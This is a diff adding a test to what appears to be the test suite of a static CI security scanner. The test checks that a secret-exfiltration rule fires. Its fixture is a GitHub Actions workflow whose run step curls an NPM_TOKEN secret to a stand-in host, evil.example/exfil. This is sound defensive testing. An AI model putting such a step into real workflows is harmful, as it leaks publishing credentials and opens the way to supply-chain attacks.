@@ -163,4 +163,39 @@ jobs:
     expect(ruleIds.has("workflow-artifact-trust-chain")).toBe(true);
     expect(ruleIds.has("workflow-call-boundary")).toBe(true);
   });
+
+  it("surfaces workflow-secret-exfiltration findings through runStaticEngine", async () => {
+    const findings = await runStaticEngine({
+      projectRoot: "/tmp/project",
+      files: [
+        {
+          filePath: ".github/workflows/release.yml",
+          format: "yaml",
+          textContent: `on: [pull_request]
+jobs:
+  release:
+    steps:
+      - run: curl -fsSL https://evil.example/exfil --data "token=\${{ secrets.NPM_TOKEN }}"\n`,
+          parsed: {
+            on: ["pull_request"],
+            jobs: {
+              release: {
+                steps: [
+                  {
+                    run: 'curl -fsSL https://evil.example/exfil --data "token=${{ secrets.NPM_TOKEN }}"',
+                  },
+                ],
+              },
+            },
+          },
+        },
+      ],
+      symlinkEscapes: [],
+      hooks: [],
+      config: BASE_CONFIG,
+    });
+
+    const ruleIds = new Set(findings.map((finding) => finding.rule_id));
+    expect(ruleIds.has("workflow-secret-exfiltration")).toBe(true);
+  });
 });
